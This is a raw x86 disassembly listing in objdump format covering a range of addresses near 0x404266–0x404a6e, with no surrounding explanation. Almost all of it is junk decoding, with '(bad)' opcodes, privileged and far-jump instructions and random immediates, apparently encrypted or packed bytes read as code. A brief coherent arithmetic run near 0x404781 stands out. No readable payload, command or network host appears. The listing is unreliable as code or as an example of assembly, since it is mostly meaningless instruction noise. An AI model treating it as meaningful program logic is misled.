  404266:	scas   eax,DWORD PTR es:[edi]
  404267:	pop    esi
  404268:	add    BYTE PTR [esi+edi*4-0x18],ah
  40426c:	stc    
  40426d:	jbe    0x4042e2
  40426f:	inc    edi
  404270:	(bad)  
  404272:	cmp    dh,BYTE PTR [ebp-0x1d9ba204]
  404278:	neg    BYTE PTR [ecx]
  40427a:	in     al,0x78
  40427c:	jg     0x404248
  40427e:	and    BYTE PTR [edx],dh
  404280:	mov    ss:0x9181c398,eax
  404286:	jecxz  0x404268
  404288:	mov    ecx,0x9b953bf1
  40428d:	(bad)  
  40428e:	jmp    0x404233
  404290:	xchg   esi,eax
  404291:	ins    DWORD PTR es:[edi],dx
  404292:	sbb    DWORD PTR [esi+0x0],0xb67dd27f
  404299:	push   ebp
  40429a:	shr    ch,1
  40429c:	iret   
  40429d:	cdq    
  40429e:	jns    0x40430c
  4042a0:	jl     0x40423e
  4042a2:	xchg   BYTE PTR [esi],ch
  4042a4:	pop    es
  4042a5:	ins    BYTE PTR es:[edi],dx
  4042a6:	test   al,0xc9
  4042a8:	sbb    DWORD PTR [edi-0x30],ebp
  4042ab:	enter  0xf70d,0xee
  4042af:	jbe    0x40432e
  4042b1:	int    0x1c
  4042b3:	test   DWORD PTR [ebx-0x37],eax
  4042b6:	in     eax,0x2d
  4042b8:	je     0x404326
  4042ba:	ja     0x404325
  4042bc:	add    BYTE PTR [ebp+0x33bd3b0d],ah
  4042c2:	sbb    DWORD PTR [esi-0x80],ebp
  4042c5:	mov    eax,0x23ae3d0f
  4042ca:	mov    bl,0x15
  4042cc:	pop    esi
  4042cd:	cli    
  4042ce:	xor    BYTE PTR [edx+0x3017f411],0xe3
  4042d5:	mov    al,0xa0
  4042d7:	or     eax,0x883f839f
  4042dc:	retf   
  4042dd:	or     eax,0x5ecbdbc2
  4042e2:	loop   0x404269
  4042e4:	mov    ah,0xaa
  4042e6:	adc    bh,dh
  4042e8:	jmp    0xd289:0x38d17b1a
  4042ef:	test   al,cl
  4042f1:	pushf  
  4042f2:	xchg   ebp,eax
  4042f3:	out    dx,al
  4042f4:	pop    ebp
  4042f5:	sub    eax,0x64349b9e
  4042fa:	sub    BYTE PTR [esi-0x25fd33ae],0x7c
  404301:	retf   0x600b
  404304:	adc    al,0x8f
  404306:	cli    
  404307:	sti    
  404308:	or     eax,0xedea4122
  40430d:	adc    al,ch
  40430f:	ret    0x9a24
  404312:	inc    edi
  404313:	fnsave [eax+0x67b5c4e]
  404319:	xchg   BYTE PTR [ebp+0x5a49b43f],ch
  40431f:	or     DWORD PTR [esi-0x4b5cbc77],edx
  404325:	aad    0xb4
  404327:	push   ss
  404328:	inc    eax
  404329:	or     dl,BYTE PTR [edi+0x5e81257f]
  40432f:	and    ebx,DWORD PTR [esi-0x6d]
  404332:	fisubr DWORD PTR [edi-0x58]
  404335:	add    DWORD PTR [ebx-0x101dd0bd],eax
  40433b:	mov    ?,WORD PTR [esi+0x53]
  40433e:	cdq    
  40433f:	xor    DWORD PTR [esi-0x407a1773],edi
  404345:	and    ebx,DWORD PTR [esp+eax*2-0x333bd184]
  40434c:	and    eax,0x24959f56
  404351:	imul   edi,DWORD PTR [eax-0x57],0x41
  404355:	push   edx
  404356:	adc    bh,bl
  404358:	jg     0x404356
  40435a:	jne    0x404304
  40435c:	xchg   ebx,eax
  40435d:	loop   0x40438f
  40435f:	jle    0x4042e4
  404361:	add    edx,DWORD PTR [ecx+esi*2]
  404364:	psubw  mm7,QWORD PTR ds:0xf3ce3795
  40436b:	pop    ss
  40436c:	xor    al,ah
  40436e:	adc    DWORD PTR [ebp-0x17280dba],ecx
  404374:	mov    ah,0x30
  404376:	sar    BYTE PTR [edx-0x2d],cl
  404379:	cmp    ch,BYTE PTR ds:0xec13acfe
  40437f:	jle    0x404365
  404381:	push   0xcb3bb11b
  404386:	mov    ds,esp
  404388:	dec    ebx
  404389:	and    ebp,DWORD PTR [edx]
  40438b:	mov    DWORD PTR [edi],esp
  40438d:	mov    ecx,0xb47540ec
  404392:	push   0xffffff9a
  404394:	sahf   
  404395:	xchg   BYTE PTR [ebx-0x51fbe127],bl
  40439b:	mov    ds:0xdd284f8a,al
  4043a0:	jg     0x4043d8
  4043a2:	pop    esi
  4043a3:	pop    ebp
  4043a4:	mov    bh,0x2b
  4043a6:	inc    ecx
  4043a7:	repz dec esi
  4043a9:	inc    esp
  4043aa:	fidiv  DWORD PTR [esi+0x9]
  4043ad:	shl    BYTE PTR [ecx-0x151ec6d1],0x60
  4043b4:	pop    ebx
  4043b5:	dec    edi
  4043b6:	xor    eax,0x246ea1bb
  4043bb:	dec    esi
  4043bc:	mov    es,WORD PTR [ecx-0x3d2cefdb]
  4043c2:	ins    DWORD PTR es:[edi],dx
  4043c3:	jbe    0x40439d
  4043c5:	daa    
  4043c6:	xchg   ecx,eax
  4043c7:	test   ah,bl
  4043c9:	mov    dl,BYTE PTR [esp+ebp*8-0x1c]
  4043cd:	ins    BYTE PTR es:[edi],dx
  4043ce:	mov    eax,ds:0xc4b130bf
  4043d3:	aad    0x8d
  4043d5:	and    BYTE PTR [ecx+0x24d775c6],ah
  4043db:	pop    ebp
  4043dc:	nop
  4043dd:	jbe    0x404394
  4043df:	int3   
  4043e0:	fcmovnbe st,st(7)
  4043e2:	dec    edx
  4043e3:	mov    edi,0xb16671cc
  4043e8:	rcpps  xmm4,XMMWORD PTR [ecx-0x9]
  4043ec:	pop    eax
  4043ed:	sahf   
  4043ee:	lods   al,BYTE PTR ds:[esi]
  4043ef:	adc    eax,0x850b9389
  4043f4:	sti    
  4043f5:	or     esp,edi
  4043f7:	mov    bh,0x19
  4043f9:	jo     0x404398
  4043fb:	imul   esi,ecx,0x8df5ffea
  404401:	fisub  DWORD PTR [ecx-0x35d2c84a]
  404407:	or     BYTE PTR [edx],bh
  404409:	pop    ebx
  40440a:	lock mov ebp,0x670c02fa
  404410:	ins    BYTE PTR es:[edi],dx
  404411:	arpl   WORD PTR [edx],si
  404413:	in     al,0x60
  404415:	cmp    ecx,DWORD PTR ds:0x5ca2d000
  40441b:	cdq    
  40441c:	xor    ebx,eax
  40441e:	clc    
  40441f:	aaa    
  404420:	imul   ebp,DWORD PTR [eax+0x17],0xffffffb0
  404424:	movaps xmm0,XMMWORD PTR [esi]
  404427:	fistp  QWORD PTR [ebp-0x53]
  40442a:	sbb    al,0x19
  40442c:	jbe    0x4043be
  40442e:	aad    0x49
  404430:	push   ebx
  404431:	jmp    0x6a30:0xd61df870
  404438:	mov    ch,0x11
  40443a:	xchg   edi,eax
  40443b:	xlat   BYTE PTR ds:[ebx]
  40443c:	arpl   WORD PTR [eax+eiz*2+0x21],bx
  404440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404441:	jge    0x4043e4
  404443:	jg     0x4043c6
  404445:	xor    eax,0x56bda07a
  40444a:	xor    al,0x33
  40444c:	jo     0x4044aa
  40444e:	aad    0xf2
  404450:	addr16 repnz (bad) 
  404453:	hlt    
  404454:	jns    0x4043df
  404456:	sbb    DWORD PTR [eax],esp
  404458:	push   esi
  404459:	xor    eax,0x1de4aabb
  40445e:	dec    edi
  40445f:	adc    al,0x9d
  404461:	sub    al,0x9e
  404463:	(bad)  [edi]
  404465:	jmp    0x4d387086
  40446a:	pop    esi
  40446b:	imul   esi,ebx,0xe
  40446e:	inc    eax
  40446f:	mov    bl,0x1a
  404471:	push   ebp
  404472:	cmp    dl,BYTE PTR [ebx+0x23]
  404475:	lds    edi,FWORD PTR [eax]
  404477:	jl     0x404482
  404479:	mov    ch,BYTE PTR [ebp+0x7b]
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404485
  404490:	xchg   ecx,eax
  404491:	and    eax,0x7e185ee1
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x404503
  40449c:	dec    ecx
  40449d:	shl    DWORD PTR [esi-0x51e8bee8],1
  4044a3:	push   eax
  4044a4:	adc    al,0x64
  4044a6:	add    DWORD PTR [edi-0x373758c1],0x3f
  4044ad:	stos   BYTE PTR es:[edi],al
  4044ae:	dec    eax
  4044af:	push   esp
  4044b0:	cmp    cl,BYTE PTR [ebp-0x36]
  4044b3:	adc    eax,0x7d54d38f
  4044b8:	sbb    al,0xb1
  4044ba:	inc    ecx
  4044bb:	dec    ecx
  4044bc:	mov    cl,0x3c
  4044be:	sti    
  4044bf:	xchg   ecx,eax
  4044c0:	or     esp,DWORD PTR [eax+esi*2-0x35]
  4044c4:	lods   eax,DWORD PTR ds:[esi]
  4044c5:	cwde   
  4044c6:	jmp    0xb460:0xba400f3f
  4044cd:	xchg   edx,eax
  4044ce:	int3   
  4044cf:	bound  ebp,QWORD PTR [edx-0x39fc109a]
  4044d5:	mov    bh,ah
  4044d7:	mov    DWORD PTR [esi+eax*2+0x3395c969],eax
  4044de:	test   eax,0x11487c51
  4044e3:	inc    ebp
  4044e4:	fs pop ebp
  4044e6:	jnp    0x40448a
  4044e8:	(bad)  
  4044e9:	cdq    
  4044ea:	(bad)  
  4044eb:	fild   DWORD PTR [edx]
  4044ed:	stc    
  4044ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044ef:	jmp    edx
  4044f1:	and    esi,0x1
  4044f4:	pusha  
  4044f5:	inc    esp
  4044f6:	adc    ch,ch
  4044f8:	xlat   BYTE PTR ds:[ebx]
  4044f9:	dec    ebp
  4044fa:	or     eax,0xa9476232
  4044ff:	or     BYTE PTR [edx+ebx*2-0x52156d0c],cl
  404506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404507:	out    dx,al
  404508:	(bad)  
  404509:	imul   BYTE PTR [ecx-0x29]
  40450c:	pop    ebp
  40450d:	popa   
  40450e:	jns    0x40453c
  404510:	push   DWORD PTR [esi]
  404512:	inc    eax
  404513:	enter  0xdc93,0xc7
  404517:	sbb    bl,BYTE PTR [eax]
  404519:	push   ebp
  40451a:	jge    0x4044f2
  40451c:	enter  0xc932,0xd4
  404520:	ss ja  0x404593
  404523:	jle    0x4044aa
  404525:	inc    ecx
  404526:	pop    es
  404527:	push   0xffffff8f
  404529:	mov    esi,0x8dd8c9a9
  40452e:	xor    esp,DWORD PTR [ebp+0x46]
  404531:	outs   dx,BYTE PTR ds:[esi]
  404532:	sub    al,0xac
  404534:	iret   
  404535:	div    DWORD PTR [ebp+ebx*8-0x320afed8]
  40453c:	mov    ah,0x9a
  40453e:	ins    BYTE PTR es:[edi],dx
  40453f:	xor    ebx,edx
  404541:	inc    esp
  404542:	mov    WORD PTR [edi],?
  404544:	mov    ah,0xca
  404546:	dec    esi
  404547:	push   ecx
  404548:	push   esp
  404549:	ror    DWORD PTR [ebx],cl
  40454b:	cmc    
  40454c:	add    ah,BYTE PTR [ebx-0x221e186a]
  404552:	mov    ah,0x5f
  404554:	jg     0x404548
  404556:	sub    DWORD PTR [esi-0x16],ebx
  404559:	cld    
  40455a:	fwait
  40455b:	les    ebp,FWORD PTR [edi-0x20]
  40455e:	dec    esi
  40455f:	adc    eax,0x6dd4cff5
  404564:	mov    ch,0x2
  404566:	sbb    edi,DWORD PTR [ebx+0x374b1b05]
  40456c:	cs in  eax,0xaf
  40456f:	lea    edx,[eax]
  404571:	mov    esp,0x324a510e
  404576:	push   ds
  404577:	jmp    0x404538
  404579:	mov    ah,0x99
  40457b:	mov    cl,0x8c
  40457d:	popa   
  40457e:	in     eax,dx
  40457f:	clc    
  404580:	xchg   ebx,eax
  404581:	xor    esp,ecx
  404583:	sbb    BYTE PTR [ebx-0x19],ah
  404586:	and    cl,dh
  404588:	dec    edi
  404589:	pop    eax
  40458a:	leave  
  40458b:	fist   DWORD PTR [ecx]
  40458d:	adc    ebp,0x55168ecd
  404593:	outs   dx,DWORD PTR ds:[esi]
  404594:	loopne 0x404578
  404596:	rol    BYTE PTR [edx+0x4b],1
  404599:	call   0x67194afc
  40459e:	mov    bl,0x28
  4045a0:	sbb    al,0x4f
  4045a2:	jmp    0xd5c17062
  4045a7:	mov    bl,0xc2
  4045a9:	pop    ebx
  4045aa:	call   0x8c47032e
  4045af:	icebp  
  4045b0:	repz jae 0x404579
  4045b3:	xor    eax,0xd4722915
  4045b8:	xchg   esi,eax
  4045b9:	sti    
  4045ba:	mov    ds:0x953ddd0f,al
  4045bf:	add    cl,BYTE PTR [eax-0x4c83bd1e]
  4045c5:	dec    esi
  4045c6:	pop    ecx
  4045c7:	(bad)  
  4045c8:	loop   0x4045f3
  4045ca:	xchg   ebp,esp
  4045cc:	adc    eax,0xf5bcb71e
  4045d1:	(bad)  
  4045d3:	cdq    
  4045d4:	int    0xcc
  4045d6:	mov    cl,0xcf
  4045d8:	imul   ecx,DWORD PTR [edx-0x47],0x57
  4045dc:	aaa    
  4045dd:	daa    
  4045de:	pop    ecx
  4045df:	outs   dx,DWORD PTR ds:[esi]
  4045e0:	pop    ebp
  4045e1:	sub    ch,BYTE PTR [ebx]
  4045e3:	sti    
  4045e4:	mov    esi,0x3cc59cb4
  4045e9:	stos   BYTE PTR es:[edi],al
  4045ea:	xor    eax,0xdb14930a
  4045ef:	imul   ebp,DWORD PTR [ecx+0x4d488640],0x1c9faafb
  4045f9:	cdq    
  4045fa:	push   0xffffffcb
  4045fc:	in     al,0x41
  4045fe:	bound  eax,QWORD PTR [eax-0x69fc6367]
  404604:	dec    esp
  404605:	fcmovb st,st(1)
  404607:	fild   QWORD PTR [ebp-0x66]
  40460a:	adc    BYTE PTR [edi-0x3ccdc296],al
  404610:	aad    0x18
  404612:	mov    eax,0xc5ac928b
  404617:	cdq    
  404618:	mov    eax,ds:0x306f318c
  40461d:	ins    DWORD PTR es:[edi],dx
  40461e:	dec    ebp
  40461f:	sbb    DWORD PTR [edx+ecx*4],edx
  404622:	and    edx,DWORD PTR ds:0x851020af
  404628:	retf   
  404629:	(bad)  
  40462a:	push   eax
  40462b:	adc    BYTE PTR [edx+0x2ca9845c],0xbb
  404632:	sbb    eax,0x94e9c4a9
  404637:	jno    0x404602
  404639:	inc    esi
  40463a:	ds mov ebx,0x2c7647fe
  404640:	cmp    al,0xc1
  404642:	add    eax,0x94ca705f
  404647:	push   edi
  404648:	push   edi
  404649:	dec    edx
  40464a:	xor    eax,0x7bb021ff
  40464f:	(bad)  
  404650:	mov    DWORD PTR [ebx+0x319b719c],edi
  404656:	add    eax,0xf576a88b
  40465b:	inc    eax
  40465c:	or     BYTE PTR [esi-0x34],dl
  40465f:	push   ds
  404660:	(bad)  
  404661:	mul    DWORD PTR [edx]
  404663:	inc    ecx
  404664:	repz (bad)
  404667:	popa   
  404668:	mov    ebp,0xa4a6cf62
  40466d:	mov    eax,ds:0x937f5f09
  404672:	add    eax,0xeac59f87
  404677:	jmp    0x3a79:0x78c1d60e
  40467e:	mov    ds,WORD PTR [esi-0x1a]
  404681:	push   ebx
  404682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404683:	pop    ebp
  404684:	xor    DWORD PTR [eax-0x448f11ce],0x3c
  40468b:	mov    ebx,0xefb2f531
  404690:	hlt    
  404691:	das    
  404692:	aaa    
  404693:	(bad)  
  404694:	aas    
  404695:	cmp    al,BYTE PTR [ecx]
  404697:	push   esp
  404698:	pushf  
  404699:	pop    esi
  40469a:	fnsave [esi-0x67054aa9]
  4046a0:	in     al,0x1d
  4046a2:	test   DWORD PTR [esi+0x14],0xe21e187e
  4046a9:	shl    BYTE PTR [esi+0x3],cl
  4046ac:	pop    ebp
  4046ad:	lea    edx,[ebx+eiz*4]
  4046b0:	push   esi
  4046b1:	cmp    DWORD PTR [edi-0x742e4844],0x6a
  4046b8:	into   
  4046b9:	cwde   
  4046ba:	mov    DWORD PTR [edi+esi*1+0x79],ebx
  4046be:	mov    esp,0xe98799e
  4046c3:	xchg   dh,bl
  4046c5:	scas   al,BYTE PTR es:[edi]
  4046c6:	dec    esi
  4046c7:	fs mov esi,0x4a2f9008
  4046cd:	fcmovnb st,st(2)
  4046cf:	xchg   ebp,eax
  4046d0:	iret   
  4046d1:	push   edx
  4046d2:	das    
  4046d3:	add    BYTE PTR [edi+ebp*2],ch
  4046d6:	push   ss
  4046d7:	jbe    0x404717
  4046d9:	cmp    bh,BYTE PTR [esi]
  4046db:	(bad)  
  4046dc:	cld    
  4046dd:	or     eax,0x338a751a
  4046e2:	(bad)  
  4046e3:	push   edi
  4046e4:	dec    eax
  4046e5:	fisubr WORD PTR [eax-0x2b]
  4046e8:	aas    
  4046e9:	pop    esp
  4046ea:	mov    bl,0x3f
  4046ec:	stos   BYTE PTR es:[edi],al
  4046ed:	inc    ecx
  4046ee:	pushf  
  4046ef:	ret    
  4046f0:	mov    bl,0xa5
  4046f2:	fs aam 0x3b
  4046f5:	mov    WORD PTR ds:0x22370bdf,?
  4046fb:	jmp    0x404744
  4046fd:	out    dx,eax
  4046fe:	cdq    
  4046ff:	mov    ebp,DWORD PTR [eax+0x162afca0]
  404705:	xchg   ebx,eax
  404706:	scas   eax,DWORD PTR es:[edi]
  404707:	xchg   bl,ch
  404709:	cmp    cl,BYTE PTR [edx-0x35]
  40470c:	mov    ebx,0xe20c6703
  404711:	mov    bl,dh
  404713:	clc    
  404714:	(bad)
  404717:	hlt    
  404718:	mov    ebp,0x45a1cd94
  40471d:	or     esi,DWORD PTR [edx]
  40471f:	push   ds
  404720:	mov    DWORD PTR [ebp+edi*1+0x19],0xa3dd4f55
  404728:	lods   al,BYTE PTR ds:[esi]
  404729:	xchg   ebx,eax
  40472a:	test   eax,0xd88b80e
  40472f:	mov    ah,0xbf
  404731:	or     BYTE PTR [ebx-0x4adde9c],bh
  404737:	pop    ebx
  404738:	push   ebx
  404739:	popa   
  40473a:	sbb    eax,0xf7cd7611
  40473f:	sub    al,0x86
  404741:	les    esi,FWORD PTR [edi+0x30]
  404744:	and    eax,edx
  404746:	jp     0x4046ea
  404748:	nop
  404749:	mov    eax,ds:0x4f485fa
  40474e:	in     al,dx
  40474f:	test   BYTE PTR [edi-0x1190052f],al
  404755:	shl    DWORD PTR [eax-0x23],1
  404758:	mov    esp,0xb2c33bdc
  40475d:	mov    edx,0x6d0f8c32
  404762:	push   ss
  404763:	mov    ?,WORD PTR [edi+eax*2]
  404766:	xchg   BYTE PTR [eax+0x61],al
  404769:	push   ds
  40476a:	lock test edx,0xd776f950
  404771:	les    edi,FWORD PTR [ebx+ebp*4-0x5f77572d]
  404778:	jae    0x4046ff
  40477a:	rol    BYTE PTR [ecx+0x19e2a692],0x73
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	cli    
  4047b5:	inc    ecx
  4047b6:	into   
  4047b7:	and    eax,0x7e7e27b8
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404832
  4047c1:	add    eax,DWORD PTR [eax+0x5f]
  4047c4:	jg     0x4047c8
  4047c6:	mov    eax,0x768b1c61
  4047cb:	xor    al,0x88
  4047cd:	inc    ebx
  4047ce:	sub    esi,esi
  4047d0:	dec    ebp
  4047d1:	dec    DWORD PTR [ebp+esi*1-0x14d16f63]
  4047d8:	sbb    esi,edx
  4047da:	lds    edx,FWORD PTR ds:0xb769c035
  4047e0:	or     ebp,DWORD PTR [edx+0x22]
  4047e3:	mov    cl,BYTE PTR [ecx+0x4a1643c7]
  4047e9:	inc    edi
  4047ea:	sbb    eax,0xa5477d7e
  4047ef:	(bad)  
  4047f0:	ins    BYTE PTR es:[edi],dx
  4047f1:	sub    al,0x3f
  4047f3:	addr16 mov ch,0xc9
  4047f6:	cmp    DWORD PTR [edx],esp
  4047f8:	sbb    edx,DWORD PTR [esi+eax*2+0x9]
  4047fc:	jbe    0x404815
  4047fe:	pop    ebp
  4047ff:	push   ss
  404800:	jno    0x404844
  404802:	fxch   st(1)
  404804:	out    dx,eax
  404805:	jp     0x4047d0
  404807:	adc    al,0x49
  404809:	outs   dx,BYTE PTR ds:[esi]
  40480a:	retf   
  40480b:	mov    eax,ds:0x95fbee28
  404810:	push   ebp
  404811:	fidivr DWORD PTR [eax-0x36ef499d]
  404817:	push   esp
  404818:	cmp    BYTE PTR [ebx+ecx*2-0x7d],dl
  40481c:	inc    esp
  40481d:	dec    esp
  40481e:	gs dec ecx
  404820:	pop    esp
  404821:	call   0x1cca:0x26d9708
  404828:	sar    BYTE PTR [eax-0x33],0xa7
  40482c:	push   eax
  40482d:	retf   0xd1bc
  404830:	or     DWORD PTR [edx+0x41],esi
  404833:	inc    ecx
  404834:	aam    0x3e
  404836:	sub    DWORD PTR [esi],0xffffffdd
  404839:	cmp    BYTE PTR [edi],bl
  40483b:	pop    ss
  40483c:	or     DWORD PTR [edx+0x3e],eax
  40483f:	push   cs
  404840:	pop    esp
  404841:	push   ebx
  404842:	test   DWORD PTR ds:0x18e2372,0xab68d103
  40484c:	data16 in al,dx
  40484e:	pop    esi
  40484f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404850:	nop
  404851:	pop    es
  404852:	mov    eax,0x1ecbfe53
  404857:	fdiv   QWORD PTR ds:0xc479c782
  40485d:	push   ecx
  40485e:	or     eax,esp
  404860:	push   ss
  404861:	das    
  404862:	push   esi
  404863:	in     eax,dx
  404864:	js     0x4048ac
  404866:	or     eax,DWORD PTR [edx+0x29]
  404869:	repz popa 
  40486b:	and    eax,0xc9bbfad8
  404870:	(bad)  
  404871:	mov    eax,0xb6bef61b
  404876:	and    eax,DWORD PTR [edx]
  404878:	je     0x404825
  40487a:	in     eax,dx
  40487b:	test   BYTE PTR [ebx],0x12
  40487e:	dec    esp
  40487f:	inc    ecx
  404880:	icebp  
  404881:	jg     0x40480f
  404883:	mov    ch,0xfe
  404885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404886:	mov    ds:0x29f3c42d,eax
  40488b:	sub    dl,BYTE PTR cs:0xa2de190c
  404892:	mov    edx,0x7da14a12
  404897:	jae    0x404901
  404899:	lock imul edx,DWORD PTR [esi+0x59a8c5f1],0x46
  4048a1:	imul   esp
  4048a3:	inc    eax
  4048a4:	jmp    DWORD PTR [eax*2+0x621cf6b9]
  4048ab:	cwde   
  4048ac:	xor    al,0x73
  4048ae:	jp     0x4048eb
  4048b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048b1:	pop    esp
  4048b2:	frstor cs:[ebx+0x56]
  4048b6:	xchg   ebx,eax
  4048b7:	pop    edi
  4048b8:	int3   
  4048b9:	nop
  4048ba:	inc    ebx
  4048bb:	push   ds
  4048bc:	jmp    0x404936
  4048be:	mov    ecx,0xc00224bf
  4048c3:	adc    BYTE PTR [ebx+0x70],dl
  4048c6:	call   0x6112:0x7106889
  4048cd:	(bad)  
  4048ce:	in     eax,dx
  4048cf:	inc    edx
  4048d0:	cs mov bh,0x59
  4048d3:	cdq    
  4048d4:	push   edx
  4048d5:	sbb    eax,0x730997e6
  4048da:	sbb    eax,0xba12cf8e
  4048df:	jle    0x4048ca
  4048e1:	popf   
  4048e2:	push   esi
  4048e3:	and    cl,BYTE PTR [ecx-0x443ccf27]
  4048e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ea:	pop    edi
  4048eb:	add    al,0xbf
  4048ed:	add    DWORD PTR [esi-0x26],ebp
  4048f0:	lods   eax,DWORD PTR ds:[esi]
  4048f1:	clc    
  4048f2:	mov    dh,BYTE PTR [esi+ecx*1-0x7]
  4048f6:	inc    DWORD PTR [ecx]
  4048f8:	sub    cl,BYTE PTR [ebx-0x2355eaba]
  4048fe:	cli    
  4048ff:	mov    edi,DWORD PTR [ebp-0x45]
  404902:	pushf  
  404903:	je     0x404925
  404905:	inc    eax
  404906:	test   BYTE PTR [ebx+0x798e2e5d],al
  40490c:	retf   
  40490d:	lea    edx,[edx]
  40490f:	shr    DWORD PTR [ebx-0x28ff95ec],0x87
  404916:	mov    al,0x61
  404918:	jp     0x404943
  40491a:	adc    ah,ch
  40491c:	jo     0x40496a
  40491e:	(bad)  
  404920:	sub    eax,0xad236e25
  404925:	loope  0x404982
  404927:	sub    DWORD PTR [ebx+0x65eb4b61],edi
  40492d:	sub    al,0x66
  40492f:	scas   al,BYTE PTR es:[edi]
  404930:	imul   BYTE PTR [eax-0x12]
  404933:	xchg   esi,eax
  404934:	iret   
  404935:	out    dx,eax
  404936:	jmp    0xb5bbe0cf
  40493b:	ja     0x40490c
  40493d:	pop    edx
  40493e:	or     ecx,edx
  404940:	ss jle 0x4049a2
  404943:	dec    ecx
  404944:	in     al,dx
  404945:	push   cs
  404946:	pop    esp
  404947:	adc    al,BYTE PTR [eax+ebx*4]
  40494a:	(bad)  
  40494b:	frstor [edx-0x5d]
  40494e:	sub    eax,DWORD PTR [ebp-0x4466b837]
  404954:	je     0x4048e0
  404956:	sbb    al,BYTE PTR [ebx-0x1a]
  404959:	je     0x4049b5
  40495b:	arpl   WORD PTR [edi-0x1d51edf2],di
  404961:	xor    bh,BYTE PTR [edx]
  404963:	jne    0x4049d6
  404965:	xchg   BYTE PTR [ebx-0x6265e827],al
  40496b:	or     al,0x5d
  40496d:	outs   dx,DWORD PTR ds:[esi]
  40496e:	jp     0x404952
  404970:	dec    ecx
  404971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404972:	lock iret 
  404974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404975:	xchg   ebx,eax
  404976:	pop    ebp
  404977:	div    DWORD PTR [edx]
  404979:	push   ebx
  40497a:	jecxz  0x4049d0
  40497c:	pusha  
  40497d:	or     BYTE PTR [edi],0x3a
  404980:	jb     0x404907
  404982:	in     eax,dx
  404983:	xchg   ebp,eax
  404984:	pushf  
  404985:	pop    ebp
  404986:	push   ss
  404987:	retf   0xbd7d
  40498a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40498b:	cmp    eax,0xfd72587f
  404990:	ds inc eax
  404992:	es jle 0x404917
  404995:	adc    ecx,ecx
  404997:	xor    DWORD PTR [ebx+0x76],ecx
  40499a:	call   0xd86cb826
  40499f:	adc    al,0xf0
  4049a1:	out    0x16,al
  4049a3:	cmp    BYTE PTR [edx-0xdc2a7ba],dl
  4049a9:	imul   ecx,edx,0xffffff9e
  4049ac:	dec    esp
  4049ad:	or     edx,DWORD PTR [edi]
  4049af:	ror    BYTE PTR [ecx],0xdf
  4049b2:	add    edi,DWORD PTR [edx+ecx*1+0x58412c1b]
  4049b9:	mov    esp,0x8941792
  4049be:	sahf   
  4049bf:	hlt    
  4049c0:	ret    
  4049c1:	out    dx,eax
  4049c2:	jle    0x40498b
  4049c4:	loopne 0x4049e7
  4049c6:	jbe    0x4049c0
  4049c8:	fld    TBYTE PTR [edi+0x62]
  4049cb:	in     eax,0xd0
  4049cd:	mov    eax,ds:0xa28b936f
  4049d2:	sub    al,ah
  4049d4:	ds mov esp,0x221afd64
  4049da:	gs retf 0x2764
  4049de:	in     eax,dx
  4049df:	(bad)  
  4049e1:	daa    
  4049e2:	jl     0x404a53
  4049e4:	push   eax
  4049e5:	aam    0x44
  4049e7:	cmp    eax,0x8793a785
  4049ec:	push   ecx
  4049ed:	pushf  
  4049ee:	adc    BYTE PTR [esi],dh
  4049f0:	in     al,dx
  4049f1:	push   0x4f
  4049f3:	dec    esp
  4049f4:	dec    ebx
  4049f5:	xchg   edx,eax
  4049f6:	outs   dx,BYTE PTR ds:[esi]
  4049f7:	aad    0x7c
  4049f9:	js     0x4049d2
  4049fb:	cmc    
  4049fc:	das    
  4049fd:	mov    ds:0x89d2b1bf,al
  404a02:	jno    0x404a38
  404a04:	dec    ebp
  404a05:	pop    esp
  404a06:	in     eax,0xb
  404a08:	into   
  404a09:	push   eax
  404a0a:	mov    eax,0x10ae3b95
  404a0f:	sbb    ah,BYTE PTR [edx+0x9412bec]
  404a15:	or     eax,0xe3830dc9
  404a1a:	jnp    0x404a47
  404a1c:	popa   
  404a1d:	jne    0xabbe813a
  404a23:	and    ebx,DWORD PTR [ebx-0x35]
  404a26:	mov    ds:0x88ad7d12,eax
  404a2b:	jl     0x4049b4
  404a2d:	addr16 mov edi,0x8d9bf4b
  404a33:	xor    al,0x0
  404a35:	inc    edi
  404a36:	fucomi st,st(7)
  404a38:	pop    ebx
  404a39:	push   edx
  404a3a:	retf   0x245
  404a3d:	les    ebx,FWORD PTR [ebp-0x6c]
  404a40:	dec    ebx
  404a41:	int    0x5
  404a43:	add    ah,BYTE PTR [edx+0x7cf53383]
  404a49:	jns    0x4049e0
  404a4b:	dec    edi
  404a4c:	fs xor al,0x8c
  404a4f:	mov    esp,esp
  404a51:	(bad)  
  404a52:	mov    ebx,0x9bea0db4
  404a57:	xchg   DWORD PTR [ecx+0x508de2ef],esi
  404a5d:	pushf  
  404a5e:	ret    
  404a5f:	or     bl,al
  404a61:	neg    DWORD PTR [ecx]
  404a63:	mov    ds:0xd8b99d23,eax
  404a68:	and    edi,DWORD PTR [ebx-0x2d72a4b2]
  404a6e:	or     esi,ebx
